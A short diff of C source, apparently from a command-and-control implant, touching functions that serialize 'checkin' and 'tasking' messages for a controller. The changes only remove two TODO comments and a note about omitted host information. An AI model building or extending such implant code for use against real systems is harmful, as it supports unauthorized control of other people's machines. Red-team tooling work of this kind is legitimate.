@@ -16,9 +16,8 @@ WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
 
 char *generate_checkin_message(CheckinRequest *checkin) {
 	// Allocate space and construct the serialized checkin message.
-	// For now, we only provide the mandatory fields (no information about the host).
 	
-	int len = 1024; // TODO dynamically calculate len based on what we're sending
+	int len = 1024;
 	int offset = 0;
 	
 	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
@@ -123,7 +122,7 @@ void free_checkin_reply(CheckinReply *reply) {
 char *generate_tasking_message(TaskingRequest *tasking) {
 	// Allocate space and construct the serialized tasking message.
 	
-	int len = 1024; // TODO dynamically calculate len based on what we're sending
+	int len = 1024;
 	int offset = 0;
 	
 	char *msg = KERNEL32$VirtualAlloc(0, len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
